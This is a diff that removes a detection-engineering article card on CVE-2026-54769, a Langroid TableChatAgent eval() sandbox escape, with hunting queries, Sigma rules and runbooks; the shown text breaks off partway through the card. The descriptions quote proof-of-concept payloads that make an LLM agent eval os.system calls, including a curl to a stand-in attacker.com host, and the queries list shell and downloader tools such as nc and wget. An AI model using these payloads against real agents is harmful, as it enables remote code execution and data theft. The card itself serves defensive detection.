@@ -1,430 +1,3 @@
-<article class="card" id="art-138" data-art-slug="2026-07-06-ghsa-critical-cve-2026-54769-langroid-sandbox-escape-to-remo"
-  data-phases="actions,c2,exploit,install,recon" data-sev="crit"
-  data-techs="T1190"
-  data-sources="GitHub Security Advisories"
-  data-platforms="datadog,def,falcon,sent,sigma,spl"
-  data-splunk-cats="application,endpoint,network"
-  data-targets="linux,vcs,windows"
-  data-uc-count="6" data-llm-uc-count="4"
-  data-search="[GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execution via Incomplete `eval()` Mitigation in TableChatAgent Langroid: Sandbox Escape to Remote Code Execution via Incomplete `eval()` Mitigation in TableChatAgent CVE-2026-54769 T1190 [LLM] Langroid Python agent spawning shell/downloader child (os.system RCE) [LLM] Outbound egress from shell/downloader child of a Python (Langroid) process [LLM] Langroid eval() exploit signature: __import__(&#x27;os&#x27;) / full_eval=True in cmdline or app logs [LLM] Vulnerable Langroid package (&lt;= 0.65.1) present on managed hosts Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execut">
-  <div class="sev-ribbon crit">Critical</div>
-  <button class="share-btn card-share" data-share-art="2026-07-06-ghsa-critical-cve-2026-54769-langroid-sandbox-escape-to-remo" title="Copy share link to this article" aria-label="Copy share link">
-    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-  </button>
-  <h2><a href="https://github.com/advisories/GHSA-q9p7-wqxg-mrhc" target="_blank" rel="noopener">[GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execution via Incomplete `eval()` Mitigation in TableChatAgent</a></h2>
-  <div class="source-badges"><span class="source-badge ">GitHub Security Advisories</span></div>
-  <div class="pubmeta">
-    <span>2026-07-06</span>
-    <span>6 use cases</span>
-    <span>1 technique</span>
-    <span>5 kill-chain phases detected</span>
-  </div>
-  <p class="summary">Langroid: Sandbox Escape to Remote Code Execution via Incomplete `eval()` Mitigation in TableChatAgent</p>
-  <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-54769</span></div>
-<div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-  <div class="action-row">
-    <button class="btn btn-kc" data-target="art-138-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
-    <button class="btn btn-hunt" data-hunt-art="art-138"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
-    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
-  </div>
-  <div class="killchain" id="art-138-kc">
-  <div class="kc3d"><div class="kc-cell hit">
-  <div class="num">Phase 1</div>
-  <div class="name">Reconnaissance</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell ">
-  <div class="num">Phase 2</div>
-  <div class="name">Weaponization</div>
-  <div class="marker">—</div>
-</div>
-<div class="kc-cell ">
-  <div class="num">Phase 3</div>
-  <div class="name">Delivery</div>
-  <div class="marker">—</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 4</div>
-  <div class="name">Exploitation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 5</div>
-  <div class="name">Installation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 6</div>
-  <div class="name">Command &amp; Control</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 7</div>
-  <div class="name">Actions on Objectives</div>
-  <div class="marker">Detected</div>
-</div></div>
-  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
-<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
-<div class="phase-line "><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
-<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] Langroid Python agent spawning shell/downloader child (os.system RCE) · [LLM] Langroid eval() exploit signature: __import__(&#x27;os&#x27;) / full_eval=True in cmdline or app logs · [LLM] Vulnerable Langroid package (&lt;= 0.65.1) present on managed hosts</em></div>
-<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-54769: Langroid: Sandbox Escape to Remote Code Execut</em></div>
-<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking. <em>→ [LLM] Outbound egress from shell/downloader child of a Python (Langroid) process</em></div>
-<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
-</div>
-  <div class="usecases"><details class="uc" data-uc-slug="7dc4fd7b4b" data-platforms="def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows" open>
-  <summary>
-    <span class="uc-title">Langroid Python agent spawning shell/downloader child (os.system RCE)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="7dc4fd7b4b" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts a Python interpreter (the Langroid TableChatAgent/VectorStore process) spawning a shell or download utility, the observable footprint of CVE-2026-54769 where eval&#x27;d LLM output calls __import__(&#x27;os&#x27;).system(). An interactive LLM-agent host forking /bin/sh -c to run curl/wget/touch is abnormal and matches the PoC exactly.
-
-Rationale: Anchored on the PoC os.system() behavior: __import__(&#x27;os&#x27;).system(&#x27;touch /tmp/rce_success_table&#x27;) forks /bin/sh -c under the python Langroid process. Cross-checked GHSA-q9p7-wqxg-mrhc, GitLab advisory (fix 0.65.2), and Langroid mitigation commit 0d9e4a7.
-
-Cross-checked against:
-  • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/
-  • https://github.com/langroid/langroid/commit/0d9e4a7bb3ae2eef8d38f2e970ff916599a2b2a6</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Python">T1059.006</span> <span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Exploitation for Client Execution">T1203</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate Langroid/pandas workflows that shell out via subprocess for data prep</li><li>Python-based CI/build agents invoking curl/wget to fetch artifacts</li><li>MLOps notebooks running !touch/!chmod cell magics that fork a shell</li><li>Application deployment scripts written in Python that call system utilities</li><li>Python package post-install hooks invoking chmod on installed binaries</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (ProcessCommandLine has_any (&quot;apt-get&quot;,&quot;pip install&quot;,&quot;/opt/ci/&quot;,&quot;jenkins&quot;,&quot;gitlab-runner&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: pull the parent python command line and the child shell command line — confirm whether the child runs curl/wget to an external host or writes to /tmp (matches PoC marker /tmp/rce_success_table). Identify the Langroid app and whether full_eval=True is set. 2) Contain: isolate the host, kill the python agent process, and block the outbound destination the child contacted; rotate any API keys/DB creds accessible to the agent process. 3) Hunt: pivot on the same host for follow-on shells, new persistence, and outbound connections; sweep the fleet for langroid &lt;= 0.65.1 and other agents with the same parent-python-spawns-shell pattern.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-138-uc0-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-138-uc0-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-138-uc0-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-138-uc0-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-138-uc0-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-138-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName matches regex @&quot;(?i)^python[0-9.]*$&quot;
-| where FileName in~ (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;curl&quot;,&quot;wget&quot;,&quot;touch&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;chmod&quot;)
-| where AccountName !endswith &quot;$&quot;
-| project Timestamp, DeviceName, AccountName,
-          ParentImage = InitiatingProcessFolderPath,
-          ParentCmd = InitiatingProcessCommandLine,
-          ChildImage = FolderPath,
-          ChildCmd = ProcessCommandLine, SHA256
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-138-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
-| where TimeGenerated &gt; ago(7d)
-| where ParentProcessName matches regex @&quot;(?i)/python[0-9.]*$&quot; or ParentProcessName matches regex @&quot;(?i)^python[0-9.]*$&quot;
-| where ActingProcessName matches regex @&quot;(?i)/(sh|bash|dash|curl|wget|touch|nc|ncat|chmod)$&quot;
-| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-138-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Langroid Python Agent Spawning Shell or Downloader (CVE-2026-54769)
-id: 8f2c1a44-6b7d-4e91-9a3c-2d51f0e7b8c1
-description: Detects a python interpreter spawning a unix shell or download utility, the runtime footprint of Langroid TableChatAgent eval() RCE
-references:
-  - https://github.com/advisories/GHSA-q9p7-wqxg-mrhc
-  - https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/
-author: SOC Detection Engineering
-date: 2026/07/14
-tags:
-  - attack.t1059.006
-  - attack.t1059.004
-  - attack.t1203
-logsource:
-  category: process_creation
-  product: linux
-detection:
-  selection:
-    ParentImage|endswith:
-      - /python
-      - /python3
-    Image|endswith:
-      - /sh
-      - /bash
-      - /dash
-      - /curl
-      - /wget
-      - /touch
-      - /nc
-      - /ncat
-  condition: selection
-level: high</code></pre></div>
-    <div class="tab-content" id="art-138-uc0-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ParentBaseFileName=/^python[0-9.]*$/i
-| ImageFileName=/\/(sh|bash|dash|curl|wget|touch|nc|ncat|chmod)$/i
-| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())</code></pre></div>
-    <div class="tab-content" id="art-138-uc0-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-138-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-138-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-138-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN (&quot;python&quot;,&quot;python3&quot;,&quot;python3.10&quot;,&quot;python3.11&quot;,&quot;python3.12&quot;) AND Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;curl&quot;,&quot;wget&quot;,&quot;touch&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;chmod&quot;)) by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-138-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN (&quot;python&quot;,&quot;python3&quot;,&quot;python3.10&quot;,&quot;python3.11&quot;,&quot;python3.12&quot;) AND Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;curl&quot;,&quot;wget&quot;,&quot;touch&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;chmod&quot;)) by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="fff5b0988c" data-platforms="def,falcon,sent,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">Outbound egress from shell/downloader child of a Python (Langroid) process</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Command &amp; Control</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="fff5b0988c" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts external network connections initiated by curl/wget/sh whose parent is a Python interpreter — the payload-retrieval / C2 leg of CVE-2026-54769 (the PoC uses os.system(&#x27;curl http://.../pwned&#x27;)). Pairs the LOLBin-egress shape with the specific python-parent context so it fires on agent-host compromise, not generic internet use.
-
-Rationale: PoC exfil/retrieval leg os.system(&#x27;curl http://attacker.com/pwned&#x27;) produces a curl/wget child of python reaching a public IP; attacker.com is an illustrative placeholder so the query pivots on the process-parentage + public-destination shape, not the domain. Sentinel left blank: ASIM network tables in this tenant don&#x27;t carry Linux parent-process context to express the pivot cleanly.
-
-Cross-checked against:
-  • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Ingress Tool Transfer">T1105</span> <span class="ind tech" title="Application Layer Protocol: Web Protocols">T1071.001</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Python apps that legitimately shell out to curl/wget to call external APIs or webhooks</li><li>Data-pipeline agents downloading remote datasets/models via curl</li><li>Telemetry/monitoring agents written in Python posting to SaaS endpoints</li><li>Package or model-weight fetch at container startup</li><li>Python health-check scripts curl-ing an external status page</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (RemoteUrl has_any (&quot;pypi.org&quot;,&quot;files.pythonhosted.org&quot;,&quot;github.com&quot;,&quot;githubusercontent.com&quot;,&quot;huggingface.co&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: resolve the remote IP/URL, check reputation, and read the curl/wget command line — a bare fetch of a script/binary to /tmp is high-signal. Correlate with UC1 process-tree hit on the same host/time. 2) Contain: block the destination at egress, isolate the host, and terminate the python agent; preserve the downloaded artifact for analysis. 3) Hunt: look for the fetched file being made executable (chmod) and re-run, additional beacons to the same ASN, and identical python-parent egress across other agent hosts.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-138-uc1-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-138-uc1-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-138-uc1-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-138-uc1-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-138-uc1-kql"><pre><button class="copy-btn">COPY</button><code>DeviceNetworkEvents
-| where Timestamp &gt; ago(7d)
-| where InitiatingProcessParentFileName matches regex @&quot;(?i)^python[0-9.]*$&quot;
-| where InitiatingProcessFileName in~ (&quot;curl&quot;,&quot;wget&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;python&quot;,&quot;python3&quot;)
-| where RemoteIPType == &quot;Public&quot;
-| project Timestamp, DeviceName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-138-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
-// Requires the Microsoft 365 Defender data connector (streams the
-// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
-DeviceNetworkEvents
-| where TimeGenerated &gt; ago(7d)
-| where InitiatingProcessParentFileName matches regex @&quot;(?i)^python[0-9.]*$&quot;
-| where InitiatingProcessFileName in~ (&quot;curl&quot;,&quot;wget&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;python&quot;,&quot;python3&quot;)
-| where RemoteIPType == &quot;Public&quot;
-| project TimeGenerated, DeviceName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-138-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=NetworkConnectIP4 ContextImageFileName=/\/(curl|wget|sh|bash|python[0-9.]*)$/i
-| NOT cidr(&quot;10.0.0.0/8&quot;, field=RemoteAddressIP4)
-| NOT cidr(&quot;192.168.0.0/16&quot;, field=RemoteAddressIP4)
-| NOT cidr(&quot;172.16.0.0/12&quot;, field=RemoteAddressIP4)
-| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())</code></pre></div>
-    <div class="tab-content" id="art-138-uc1-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-138-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-138-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-138-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.parent_process_name IN (&quot;python&quot;,&quot;python3&quot;,&quot;python3.10&quot;,&quot;python3.11&quot;,&quot;python3.12&quot;) AND All_Traffic.process_name IN (&quot;curl&quot;,&quot;wget&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;python&quot;,&quot;python3&quot;) AND All_Traffic.dest_category!=&quot;internal&quot;) by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.process_name All_Traffic.parent_process_name | `drop_dm_object_name(All_Traffic)` | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-138-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.parent_process_name IN (&quot;python&quot;,&quot;python3&quot;,&quot;python3.10&quot;,&quot;python3.11&quot;,&quot;python3.12&quot;) AND All_Traffic.process_name IN (&quot;curl&quot;,&quot;wget&quot;,&quot;sh&quot;,&quot;bash&quot;,&quot;python&quot;,&quot;python3&quot;) AND All_Traffic.dest_category!=&quot;internal&quot;) by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.process_name All_Traffic.parent_process_name | `drop_dm_object_name(All_Traffic)` | sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="7616a593fe" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
-  <summary>
-    <span class="uc-title">Langroid eval() exploit signature: __import__(&#x27;os&#x27;) / full_eval=True in cmdline or app logs</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="7616a593fe" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Alerts on the literal CVE-2026-54769 exploit and dangerous-config strings — __import__(&#x27;os&#x27;).system(, pandas_eval expressions, and full_eval=True — appearing in Linux process command lines or application/syslog output. Catches both the risky enabling config and the injected payload as it is logged by the pandas_eval tool, before/independent of process-tree spawn.
-
-Rationale: Uses the exact article strings: the payload prefix __import__(&#x27;os&#x27;).system(, the vulnerable pandas_eval tool name, the TableChatAgent class, and the gating full_eval=True config. These are high-fidelity and near-zero in benign traffic. Corroborated by GitLab advisory and Langroid fix commit 0d9e4a7 (patched 0.65.2).
-
-Cross-checked against:
-  • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/
-  • https://github.com/langroid/langroid/commit/0d9e4a7bb3ae2eef8d38f2e970ff916599a2b2a6</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploitation for Client Execution">T1203</span> <span class="ind tech" title="Command and Scripting Interpreter: Python">T1059.006</span> <span class="ind tech" title="Obfuscated Files or Information">T1027</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Security researchers/red-team running the published PoC in a lab</li><li>Langroid developers legitimately configuring full_eval=True in a trusted-input scenario</li><li>Unit tests or documentation examples that reference pandas_eval / TableChatAgent</li><li>A WAF/proxy log echoing a blocked prompt that contained __import__(&#x27;os&#x27;)</li><li>Vulnerability-scanner payloads probing for CVE-2026-54769</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: determine whether the string is a config (full_eval=True — risky posture) or an active payload (__import__(&#x27;os&#x27;) — likely exploitation). For payloads, extract the command inside os.system() and check for follow-on shell/network activity (UC1/UC2). 2) Contain: if a payload executed, isolate the host and kill the agent; if it is only config, flag the app owner to disable full_eval and upgrade langroid to &gt;= 0.65.2. 3) Hunt: search all app/syslog for other injected expressions from the same source/user, and inventory every langroid deployment with full_eval enabled.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-138-uc2-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-138-uc2-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-138-uc2-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-138-uc2-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-138-uc2-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-138-uc2-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-138-uc2-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(30d)
-| where ProcessCommandLine has_any (&quot;__import__(&#x27;os&#x27;)&quot;, &quot;full_eval=True&quot;, &quot;pandas_eval&quot;, &quot;TableChatAgent&quot;)
-| project Timestamp, DeviceName, AccountName, FileName, InitiatingProcessFileName, ProcessCommandLine
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-138-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>Syslog
-| where TimeGenerated &gt; ago(30d)
-| where SyslogMessage has_any (&quot;__import__(&#x27;os&#x27;)&quot;, &quot;full_eval=True&quot;, &quot;pandas_eval&quot;, &quot;TableChatAgent&quot;)
-| project TimeGenerated, Computer, ProcessName, Facility, SyslogMessage
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-138-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: Langroid eval() Exploit or Dangerous full_eval Config String (CVE-2026-54769)
-id: 3d9e77a2-1c40-4f8b-b6e2-9a71c4d0f5e3
-description: Detects Langroid TableChatAgent RCE payload markers or the full_eval=True dangerous config in process command lines
-references:
-  - https://github.com/advisories/GHSA-q9p7-wqxg-mrhc
-  - https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/
-author: SOC Detection Engineering
-date: 2026/07/14
-tags:
-  - attack.t1203
-  - attack.t1059.006
-  - attack.t1027
-logsource:
-  category: process_creation
-  product: linux
-detection:
-  selection:
-    CommandLine|contains:
-      - &quot;__import__(&#x27;os&#x27;)&quot;
-      - &#x27;full_eval=True&#x27;
-      - &#x27;pandas_eval&#x27;
-      - &#x27;TableChatAgent&#x27;
-  condition: selection
-level: high</code></pre></div>
-    <div class="tab-content" id="art-138-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.syslog (&quot;__import__(&#x27;os&#x27;)&quot; OR &quot;full_eval=True&quot; OR pandas_eval OR TableChatAgent)</code></pre></div>
-    <div class="tab-content" id="art-138-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ImageFileName=/\/python[0-9.]*$/i
-| regex(&quot;(full_eval=True|__import__\\(&#x27;os&#x27;\\)|pandas_eval|TableChatAgent)&quot;, field=CommandLine)
-| groupBy([aid, ComputerName, CommandLine], function=count())</code></pre></div>
-    <div class="tab-content" id="art-138-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-138-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-138-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-138-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process=&quot;*__import__(&#x27;os&#x27;)*&quot; OR Processes.process=&quot;*full_eval=True*&quot; OR Processes.process=&quot;*pandas_eval*&quot; OR Processes.process=&quot;*TableChatAgent*&quot;) by Processes.dest Processes.user Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-138-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process=&quot;*__import__(&#x27;os&#x27;)*&quot; OR Processes.process=&quot;*full_eval=True*&quot; OR Processes.process=&quot;*pandas_eval*&quot; OR Processes.process=&quot;*TableChatAgent*&quot;) by Processes.dest Processes.user Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="746db30990" data-platforms="def,sent" data-targets="">
-  <summary>
-    <span class="uc-title">Vulnerable Langroid package (&lt;= 0.65.1) present on managed hosts</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="746db30990" title="Copy share link to this UC" aria-label="Copy share link">
